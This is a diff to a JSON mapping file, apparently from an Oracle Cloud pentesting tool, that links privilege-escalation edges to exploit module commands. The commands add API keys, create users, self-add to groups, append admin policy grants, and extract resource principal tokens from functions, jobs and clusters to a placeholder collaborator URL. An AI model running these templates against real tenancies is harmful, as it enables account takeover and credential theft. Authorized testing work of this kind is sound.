@@ -9,13 +9,17 @@
     "IDD_USER_ADMIN": {
       "module": "exploit_add_user_api_key",
       "authz": "Identity Domain app-role: User Administrator",
-      "includes_edges": ["IDD_CREATE_USER_API_KEY"],
+      "includes_edges": [
+        "IDD_CREATE_USER_API_KEY"
+      ],
       "template": "modules run exploit_add_user_api_key --user-ocid {destination_id} --idd --domain-url {dest_domain_url} --yes"
     },
     "IDD_IDENTITY_ADMIN_USER": {
       "module": "exploit_add_user_api_key",
       "authz": "Identity Domain app-role: Identity Domain Administrator",
-      "includes_edges": ["IDD_CREATE_USER_API_KEY"],
+      "includes_edges": [
+        "IDD_CREATE_USER_API_KEY"
+      ],
       "template": "modules run exploit_add_user_api_key --user-ocid {destination_id} --idd --domain-url {dest_domain_url} --yes"
     },
     "OCI_CREATE_USER": {
@@ -29,14 +33,14 @@
       "template": "modules run exploit_create_user --name <NEW_USERNAME> --idd --domain-url {dest_domain_url} --with-api-key"
     },
     "OCI_ADD_SELF_TO_GROUP": {
-      "module": "exploit_add_self_to_group",
+      "module": "exploit_add_user_to_group",
       "authz": "OCI IAM policy permission (GROUP_UPDATE)",
-      "template": "modules run exploit_add_self_to_group --group-ocid {destination_id} --self"
+      "template": "modules run exploit_add_user_to_group --group-ocid {destination_id} --self"
     },
     "IDD_ADD_SELF_TO_GROUP": {
-      "module": "exploit_add_self_to_group",
+      "module": "exploit_add_user_to_group",
       "authz": "Identity Domain group-management app-role",
-      "template": "modules run exploit_add_self_to_group --group-ocid {destination_id} --idd --domain-url {dest_domain_url} --self"
+      "template": "modules run exploit_add_user_to_group --group-ocid {destination_id} --idd --domain-url {dest_domain_url} --self"
     },
     "OCI_CREATE_POLICY": {
       "module": "exploit_write_policy",
@@ -49,9 +53,45 @@
       "template": "modules run exploit_write_policy --append-to {destination_id} --self  # append an admin grant to an existing policy"
     },
     "GENERATE_RPST": {
-      "module": "exploit_generate_rpst_fn",
-      "authz": "OCI IAM manage permissions on the target resource type (fn-function, devops-build-pipeline, dataflow-runs, compute-container-instances, data-science-job-runs, etc.)",
-      "template": "modules run exploit_generate_rpst_fn --resource-ocid {dest_ocid}  # inject RPST exfil into {dest_name}; see wiki RPST-Extraction for per-service procedure"
+      "module": "exploit_functions_rpst",
+      "authz": "OCI IAM manage permissions on the target resource type (fn-function, dataflow-runs, compute-container-instances, cluster-family, data-science-pipeline-runs, etc.)",
+      "template": "# Select module by target resource type -- see `modules list` for full RPST module list:\n# Functions:            modules run exploit_functions_rpst --function-id {dest_ocid}\n# DataFlow:             modules run exploit_dataflow_runs_rpst --app-id {dest_ocid} --output-url <COLLAB_URL>\n# DataScience Jobs:     modules run exploit_datascience_jobs_rpst --job-id {dest_ocid} --output-url <COLLAB_URL>\n# DS Pipeline:          modules run exploit_datascience_pipelines_rpst --pipeline-id {dest_ocid} --output-url <COLLAB_URL>\n# ContainerInstances:   modules run exploit_containerinstances_rpst --output-url <COLLAB_URL>\n# OKE:                  modules run exploit_kubernetes_clusters_rpst --cluster-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "GENERATE_RPST_FN_FUNCTION": {
+      "module": "exploit_functions_rpst",
+      "template": "modules run exploit_functions_rpst --function-id {dest_ocid}"
+    },
+    "GENERATE_RPST_DATAFLOW_RUN": {
+      "module": "exploit_dataflow_runs_rpst",
+      "template": "modules run exploit_dataflow_runs_rpst --app-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "GENERATE_RPST_CONTAINER_INSTANCE": {
+      "module": "exploit_containerinstances_rpst",
+      "template": "modules run exploit_containerinstances_rpst --container-instance-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "GENERATE_RPST_DS_JOB_RUN": {
+      "module": "exploit_datascience_jobs_rpst",
+      "template": "modules run exploit_datascience_jobs_rpst --job-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "GENERATE_RPST_OKE_CLUSTER": {
+      "module": "exploit_kubernetes_clusters_rpst",
+      "template": "modules run exploit_kubernetes_clusters_rpst --cluster-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "GENERATE_RPST_DS_PIPELINE_RUN": {
+      "module": "exploit_datascience_pipelines_rpst",
+      "template": "modules run exploit_datascience_pipelines_rpst --pipeline-id {dest_ocid} --output-url <COLLAB_URL>"
+    },
+    "OCI_CREATE_FN_FUNCTION": {
+      "module": "exploit_functions_rpst",
+      "template": "modules run exploit_functions_rpst --output-url <COLLAB_URL>  # create function in {dest_compartment} first"
+    },
+    "OCI_CREATE_CONTAINER_INSTANCE": {
+      "module": "exploit_containerinstances_rpst",
+      "template": "modules run exploit_containerinstances_rpst --output-url <COLLAB_URL>  # create container instance in {dest_compartment} first"
+    },
+    "OCI_CREATE_OKE_CLUSTER": {
+      "module": "exploit_kubernetes_clusters_rpst",
+      "template": "modules run exploit_kubernetes_clusters_rpst --output-url <COLLAB_URL>  # create OKE cluster in {dest_compartment} first"
     }
   }
 }
